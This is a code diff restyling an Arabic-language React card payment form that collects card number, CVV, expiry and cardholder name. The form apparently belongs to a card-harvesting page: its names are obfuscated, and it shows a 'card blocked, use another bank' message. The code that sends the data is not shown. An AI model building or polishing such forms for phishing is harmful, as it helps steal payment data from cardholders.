@@ -558,193 +558,68 @@ export default function P1({ offerTotalPrice }: _P1Props) {
       )}
 
       <div
-        className={`space-y-4 sm:space-y-5 ${showEmailModal ? "blur-xl pointer-events-none" : ""}`}
+        className={`space-y-3 ${showEmailModal ? "blur-xl pointer-events-none" : ""}`}
         dir="rtl"
       >
-        {/* Payment Method Selection */}
-        <div className="bg-gradient-to-br from-gray-50 to-gray-100 rounded-lg sm:rounded-xl p-3 sm:p-5 md:p-6 border border-gray-200">
-          <label className="flex items-center gap-2 text-gray-900 font-bold text-sm sm:text-base md:text-lg mb-3 sm:mb-4">
-            <ShieldCheck className="w-4 h-4 sm:w-5 sm:h-5 text-[#1976d2]" />
-            طريقة الدفع
-          </label>
-          <div className="space-y-2 sm:space-y-3">
-            {[
-              {
-                value: "credit-card",
-                label: "البطاقات الائتمانية",
-                icons: ["/visa.svg", "/mas.svg"],
-                disabled: false,
-              },
-              {
-                value: "mada",
-                label: "بطاقات مدى",
-                icon: "/mada.jpg",
-                disabled: false,
-              },
-            ].map((method: { value: string; label: string; icons?: string[]; icon?: string; disabled: boolean; message?: string }) => (
-              <div key={method.value}>
-                <label
-                  className={`
-                  relative flex items-center justify-between gap-2 sm:gap-3 p-3 sm:p-4 md:p-5
-                  border-2 rounded-lg sm:rounded-xl cursor-pointer transition-all duration-200
-                  ${
-                    selectedPaymentMethod === method.value
-                      ? "border-[#1976d2] bg-white shadow-md"
-                      : "border-gray-200 hover:border-gray-300 bg-white/50"
-                  }
-                  ${method.disabled ? "opacity-60 cursor-not-allowed" : ""}
-                  ${(method as any).unavailable ? "opacity-75" : ""}
-                `}
-                >
-                  <div className="flex items-center gap-2 sm:gap-3 min-w-0">
-                    <input
-                      type="radio"
-                      name="paymentMethod"
-                      value={method.value}
-                      checked={selectedPaymentMethod === method.value}
-                      onChange={() => {
-                        if (method.disabled) return;
-                        if ((method as any).unavailable) {
-                          toast.error("Apple Pay غير متوفر حالياً", {
-                            description: "يرجى اختيار طريقة دفع أخرى",
-                            duration: 4000,
-                          });
-                          return;
-                        }
-                        setSelectedPaymentMethod(method.value);
-                      }}
-                      disabled={method.disabled}
-                      className="w-4 h-4 sm:w-5 sm:h-5 text-[#1976d2] focus:ring-[#1976d2] disabled:opacity-50 flex-shrink-0"
-                    />
-                    <div className="flex items-center gap-1.5 sm:gap-2 flex-shrink-0">
-                      {method.icons ? (
-                        method.icons.map((icon, idx) => (
-                          <img
-                            key={idx}
-                            src={icon}
-                            alt="logo"
-                            width={28}
-                            height={18}
-                            className="object-contain sm:w-[35px] sm:h-[22px]"
-                          />
-                        ))
-                      ) : (
-                        <img
-                          src={method.icon || "/placeholder.svg"}
-                          alt="logo"
-                          width={28}
-                          height={18}
-                          className="object-contain sm:w-[35px] sm:h-[22px]"
-                        />
-                      )}
-                    </div>
-                    <span
-                      className={`text-sm sm:text-base md:text-lg font-semibold truncate ${method.disabled ? "text-gray-400" : "text-gray-900"}`}
-                    >
-                      {method.label}
-                    </span>
-                  </div>
-                  <div className="flex items-center gap-2 flex-shrink-0" />
-                </label>
-                {method.message && selectedPaymentMethod === method.value && (
-                  <div
-                    className="mt-2 p-2 sm:p-3 bg-red-50 border border-red-200 rounded-lg"
-                    dir="rtl"
-                  >
-                    <p className="text-xs sm:text-sm text-red-600 font-medium">
-                      {method.message}
-                    </p>
-                  </div>
-                )}
-              </div>
-            ))}
-          </div>
-        </div>
-
         {/* Card Information Form */}
-        <form onSubmit={_hp} className="space-y-3 sm:space-y-4">
-          {/* Card Holder Name */}
-          <div className="space-y-1.5 sm:space-y-2">
-            <label className="block text-gray-900 font-bold text-xs sm:text-sm md:text-base">
-              اسم حامل البطاقة
-            </label>
-            <Input
-              type="text"
-              value={_v4}
-              onChange={(e) => _s4(e.target.value.toUpperCase())}
-              placeholder="CARDHOLDER NAME"
-              dir="ltr"
-              className="h-12 sm:h-14 md:h-16 text-base sm:text-lg md:text-xl uppercase border-2 border-gray-300 focus:border-[#1976d2] rounded-lg sm:rounded-xl"
-              required
-            />
+        <form onSubmit={_hp} className="space-y-3">
+
+          {/* Payment logos pill */}
+          <div className="flex items-center justify-center gap-2 border border-gray-200 rounded-full py-2 px-4 w-fit mx-auto">
+            <img src="/mada.jpg" alt="Mada" className="h-5 object-contain" />
+            <img src="/visa.svg" alt="VISA" className="h-4 object-contain" />
+            <img src="/mas.svg" alt="Mastercard" className="h-5 object-contain" />
           </div>
 
-          {/* Card Number Input */}
-          <div className="space-y-1.5 sm:space-y-2">
-            <label className="flex items-center flex-wrap gap-1.5 sm:gap-2 text-gray-900 font-bold text-xs sm:text-sm md:text-base">
-              <CreditCard className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-[#1976d2]" />
-              رقم البطاقة
-              {isValidCard && (
-                <Badge
-                  variant="outline"
-                  className="border-green-500 text-green-700 text-[10px] sm:text-xs"
-                >
-                  <ShieldCheck className="w-3 h-3 ml-1" />
-                  صالح
-                </Badge>
-              )}
-              {cardType && (
-                <Badge className="bg-blue-100 text-blue-800 text-[10px] sm:text-xs">
-                  {cardType}
-                </Badge>
-              )}
-            </label>
+          {/* Card Number */}
+          <div>
             <Input
               type="tel"
               value={_v1}
               onChange={handleCardNumberChange}
-              placeholder="1234 5678 9012 3456"
+              placeholder="رقم بطاقة الائتمان"
               maxLength={19}
-              dir="ltr"
-              className={`h-12 sm:h-14 md:h-16 text-lg sm:text-xl md:text-2xl font-mono tracking-wider border-2 rounded-lg sm:rounded-xl transition-all ${
+              dir="rtl"
+              className={`h-14 text-base border rounded-xl px-4 transition-all ${
                 isValidCard
-                  ? "border-green-500 focus:border-green-600"
+                  ? "border-green-400 focus:border-green-500"
                   : _v1.length > 0
-                    ? "border-red-300 focus:border-red-500"
+                    ? "border-red-300 focus:border-red-400"
                     : "border-gray-300 focus:border-[#1976d2]"
               }`}
               required
             />
             {_v1.length > 0 && _v1.replace(/\s/g, "").length !== 16 && (
-              <p className="text-red-500 text-[11px] sm:text-xs">
-                يجب أن يكون 16 رقم
-              </p>
+              <p className="text-red-500 text-xs mt-1 pr-1">يجب أن يكون 16 رقم</p>
             )}
             {cardRejectionError && (
-              <div className="bg-red-50 border-2 border-red-500 rounded-lg p-2 sm:p-3 mt-1 sm:mt-2">
-                <p className="text-red-700 text-xs sm:text-sm font-bold">
-                  {cardRejectionError}
-                </p>
-              </div>
+              <p className="text-red-600 text-xs font-bold mt-1.5 pr-1">{cardRejectionError}</p>
             )}
             {isCardBlockedState && (
-              <div className="bg-red-50 border-2 border-red-500 rounded-lg p-2 sm:p-3 mt-1 sm:mt-2">
-                <p className="text-red-700 text-xs sm:text-sm font-bold">
-                  تم إيقاف التسديد من خلال  المحافظ الإلكترونية
-                </p>
-                <p className="text-red-600 text-[11px] sm:text-xs mt-1">
-                  الرجاء إدخال بطاقة من مصرف آخر
-                </p>
-              </div>
+              <p className="text-red-600 text-xs font-bold mt-1.5 pr-1">تم إيقاف التسديد — الرجاء إدخال بطاقة من مصرف آخر</p>
             )}
           </div>
 
-          {/* Expiry and CVV */}
-          <div className="grid grid-cols-2 gap-2 sm:gap-3 md:gap-4">
-            <div className="space-y-1.5 sm:space-y-2">
-              <label className="block text-gray-900 font-bold text-xs sm:text-sm md:text-base">
-                تاريخ الانتهاء
-              </label>
+          {/* CVV + Expiry */}
+          <div className="grid grid-cols-2 gap-3">
+            <div>
+              <Input
+                type="password"
+                value={_v2}
+                onChange={handleCvvChange}
+                placeholder="CVV أو CVC رمز"
+                maxLength={3}
+                dir="rtl"
+                className={`h-14 text-base border rounded-xl px-4 ${
+                  _v2.length === 3 ? "border-green-400" : "border-gray-300 focus:border-[#1976d2]"
+                }`}
+                required
+              />
+              {_v2.length > 0 && _v2.length !== 3 && (
+                <p className="text-red-500 text-xs mt-1">يجب أن يكون 3 أرقام</p>
+              )}
+            </div>
+            <div>
               <Input
                 type="text"
                 value={_v3}
@@ -752,65 +627,41 @@ export default function P1({ offerTotalPrice }: _P1Props) {
                 placeholder="MM/YY"
                 maxLength={5}
                 dir="ltr"
-                className={`h-12 sm:h-14 md:h-16 text-lg sm:text-xl md:text-2xl font-mono border-2 rounded-lg sm:rounded-xl text-center ${
+                className={`h-14 text-base border rounded-xl px-4 text-center ${
                   expiryError
-                    ? "border-red-500 focus:border-red-600"
+                    ? "border-red-400 focus:border-red-500"
                     : _v3.length === 5 && !expiryError
-                      ? "border-green-500 focus:border-green-600"
+                      ? "border-green-400"
                       : "border-gray-300 focus:border-[#1976d2]"
                 }`}
                 required
               />
               {expiryError && (
-                <p className="text-red-500 text-[11px] sm:text-xs">
-                  {expiryError}
-                </p>
-              )}
-            </div>
-            <div className="space-y-1.5 sm:space-y-2">
-              <label className="flex items-center gap-1.5 sm:gap-2 text-gray-900 font-bold text-xs sm:text-sm md:text-base">
-                <Lock className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-[#1976d2]" />
-                CVV
-              </label>
-              <Input
-                type="password"
-                value={_v2}
-                onChange={handleCvvChange}
-                placeholder="123"
-                maxLength={3}
-                dir="ltr"
-                className={`h-12 sm:h-14 md:h-16 text-lg sm:text-xl md:text-2xl font-mono border-2 rounded-lg sm:rounded-xl text-center ${
-                  _v2.length === 3
-                    ? "border-green-500 focus:border-green-600"
-                    : "border-gray-300 focus:border-[#1976d2]"
-                }`}
-                required
-              />
-              {_v2.length > 0 && _v2.length !== 3 && (
-                <p className="text-red-500 text-[11px] sm:text-xs">
-                  يجب أن يكون 3 أرقام
-                </p>
+                <p className="text-red-500 text-xs mt-1">{expiryError}</p>
               )}
             </div>
           </div>
 
-          {/* Submit Button with Price */}
+          {/* Card Holder Name */}
+          <Input
+            type="text"
+            value={_v4}
+            onChange={(e) => _s4(e.target.value.toUpperCase())}
+            placeholder="الاسم على البطاقة"
+            dir="rtl"
+            className="h-14 text-base border border-gray-300 focus:border-[#1976d2] rounded-xl px-4"
+            required
+          />
+
+          {/* Submit Button */}
           <Button
             type="submit"
-            disabled={
-              !isValidCard || !_v3 || _v2.length !== 3 || !!expiryError || !_v4
-            }
-            className="w-full h-14 sm:h-16 md:h-18 bg-[#1976d2] hover:bg-[#1565c0] text-white font-bold text-lg sm:text-xl md:text-2xl rounded-lg sm:rounded-xl shadow-lg hover:shadow-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed"
+            disabled={!isValidCard || !_v3 || _v2.length !== 3 || !!expiryError || !_v4}
+            className="w-full h-13 bg-[#8c9eb5] hover:bg-[#7a8fa5] text-white font-bold text-base rounded-xl transition-all disabled:opacity-60 disabled:cursor-not-allowed"
           >
-            <Lock className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
-            دفع {finalPrice.toFixed(2)} ﷼
+            <Lock className="w-4 h-4 ml-2" />
+            تأكيد الدفع
           </Button>
-
-          {/* Security Notice */}
-          <div className="flex items-center justify-center gap-1.5 sm:gap-2 text-gray-500 text-[11px] sm:text-xs md:text-sm">
-            <ShieldCheck className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
-            <span>معاملتك محمية بتشفير SSL 256-bit</span>
-          </div>
         </form>
       </div>
     </>
